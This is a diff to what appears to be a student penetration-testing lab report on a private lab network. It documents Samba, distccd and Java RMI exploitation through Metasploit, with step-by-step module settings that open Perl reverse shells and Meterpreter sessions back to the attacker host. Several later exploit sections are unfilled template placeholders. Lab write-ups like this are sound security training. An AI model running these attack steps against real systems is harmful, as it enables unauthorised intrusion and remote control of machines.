@@ -101,12 +101,157 @@ Key findings (65505 closed, notable open ports):
   7. whoami / id 
       
 - **Evidence:** evidence/exploit3.png>
-- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance -
--  Weaponization
--  Exploitation
--  Installation, C2
+- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance - nmap identified vulnerable Samba version 3.0.20-Debian
+-  Weaponization - selected the matching command-injection module and configured the netcat reverse-she payload
+-  Delivery - module sent the crafted malicious username to the SB service 
+-  Exploitation - username map script executed the injection shell command  
+-  Installation, C2 - reverse netcat shell connected back giving remote control
+    
+- **Outcome / Impact:** Remote command execution/shell access on the target via SMB
+
+
+## Exploit 4: distcod Remote Code Execution
+
+- **Service / Port:** distcc/3632
+- **Vulnerability:** distccd (distributed compiler daemon) accepts and executes compilation requests from any client with no authentication by default
+- 
+- **Tool Used:**  Metasploit — exploit/unix/misc/distcc_exec
+- 
+- **Why This Tool:** distcc's wire protocol for submitting compile jobs is non-trivial to construct manually. Metasploit's module formats a valid distcc job request that smuggles a shell command as the "compilation," which would otherwise require reverse-engineering the distcc protocol by hand
+- 
+- **Steps:**
+  1. search distcc
+  2. use exploit/unix/misc/distcc_exec which defaulted to cmd/unix/reverse_bash
+  3. set RHOSTS 192.168.1.4
+  4. set LHOSTS 192.168.1.3
+  5. exploit - first attempt failed(target's bash lacked/dev/tcp support(bad file descriptor errors.
+  6. set PAYLOAD cmd/unix/reverse_perl - Perl reverse shell, since bash networking wasn't available
+  7. set LPORT 4444
+  8. exploit - command shell session opened
+  9. whoami 
+       
+- **Evidence:**  evidence/exploit4.png
+- **Cyber Kill Chain Stage(s):**  Reconnaissance - nmap identified distccd v1 on 3632
+-  Weaponization - selected module, adapted payload after the default failed to match the target's available interpreters
+-  Delivery - crafted distcc job request sent to the daemon
+-  Exploitation - daemon executed the embedded Perl reverse shell command
+-   Installation, C2 - shell session established
+    
+- **Outcome / Impact:** Remote command execution on the target 
+
+## Exploit 5: Java RMI Registry RCE(port 1099)
+
+- **Service / Port:** Java RMI/1099
+- **Vulnerability:** Insecure default configuration of the Java RMI registry - remote clients can register and invoke arbitrary RMI objects leading to remote code execution when a machine class is loaded
+- 
+- **Tool Used:**  Metasploit — exploit/multi/misc/java_rmi_server
+- 
+- **Why This Tool:** Exploiting Java RMI requires implementing an RMI-compliant remote object handshake and serving a malicious Java class via HTTP for the target to load — Metasploit automates both the RMI protocol negotiation and hosting the payload JAR, which would otherwise require writing custom Java RMI client code
+- **Steps:**
+ 1. search java_rmi
+ 2. use exploit/multi/misc/java_rmi_server (defaulted to Java Meterpreter reverse TCP payload)
+ 3. set RHOSTS 192.168.1.4
+ 4. set RPORT 1099
+ 5. set LHOST 192.168.1.3
+ 6. exploit - started a payload-hosting HTTP server, target's RMI registry called back and loaded the malicious class, Meterpreter session 4 opened
+ 7. Confirmed with getuid
+
+- **Evidence:**  evidence/exploit1.png
+- **Cyber Kill Chain Stage(s):** Reconnaissance - nmap identified GNU Classpath grmiregistry on 1099
+- Weaponization - selected module, payload JAR prepared and hosted
+-  Delivery - target's RMI service was tricked into fetching the payload JAR over HTTP
+-  Exploitation - malicious class loaded and executed by the JVM 
+-  Installation, C2 - Meterpreter session established
+  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
+- **Outcome / Impact:** Full Meterpreter session on the target via the RMI service
+  
+
+## Exploit 6: <Short title, e.g. "vsftpd 2.3.4 Backdoor">
+
+- **Service / Port:** <e.g. FTP / 21>
+- **Vulnerability:** <name/CVE if known>
+- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
+- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
+  not a generic "Metasploit is good for exploits" answer.>
+- **Steps:**
+  1. <exact command/action>
+  2. <exact command/action>
+  3. <...>
+- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
+- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
   - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
 - **Outcome / Impact:** <What access/data/privilege you actually got>
+
+  ## Exploit 7: <Short title, e.g. "vsftpd 2.3.4 Backdoor">
+
+- **Service / Port:** <e.g. FTP / 21>
+- **Vulnerability:** <name/CVE if known>
+- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
+- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
+  not a generic "Metasploit is good for exploits" answer.>
+- **Steps:**
+  1. <exact command/action>
+  2. <exact command/action>
+  3. <...>
+- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
+- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
+  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
+- **Outcome / Impact:** <What access/data/privilege you actually got>
+
+## Exploit 8: <Short title, e.g. "vsftpd 2.3.4 Backdoor">
+
+- **Service / Port:** <e.g. FTP / 21>
+- **Vulnerability:** <name/CVE if known>
+- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
+- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
+  not a generic "Metasploit is good for exploits" answer.>
+- **Steps:**
+  1. <exact command/action>
+  2. <exact command/action>
+  3. <...>
+- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
+- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
+  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
+- **Outcome / Impact:** <What access/data/privilege you actually got>
+
+
+  ## Exploit 9: <Short title, e.g. "vsftpd 2.3.4 Backdoor">
+
+- **Service / Port:** <e.g. FTP / 21>
+- **Vulnerability:** <name/CVE if known>
+- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
+- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
+  not a generic "Metasploit is good for exploits" answer.>
+- **Steps:**
+  1. <exact command/action>
+  2. <exact command/action>
+  3. <...>
+- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
+- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
+  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
+- **Outcome / Impact:** <What access/data/privilege you actually got>
+
+## Exploit 10: <Short title, e.g. "vsftpd 2.3.4 Backdoor">
+
+- **Service / Port:** <e.g. FTP / 21>
+- **Vulnerability:** <name/CVE if known>
+- **Tool Used:** <e.g. Metasploit — exploit/unix/ftp/vsftpd_234_backdoor>
+- **Why This Tool:** <Why this was the right tool/module for this specific vulnerability —
+  not a generic "Metasploit is good for exploits" answer.>
+- **Steps:**
+  1. <exact command/action>
+  2. <exact command/action>
+  3. <...>
+- **Evidence:** <path to screenshot, e.g. evidence/exploit1.png>
+- **Cyber Kill Chain Stage(s):** <e.g. Reconnaissance, Weaponization, Exploitation, Installation, C2>
+  - <one or two sentences justifying WHY each stage you listed applies to this specific exploit>
+- **Outcome / Impact:** <What access/data/privilege you actually got>
+
+
+
+
+
+  
 
 ## Kill Chain Coverage Summary
 
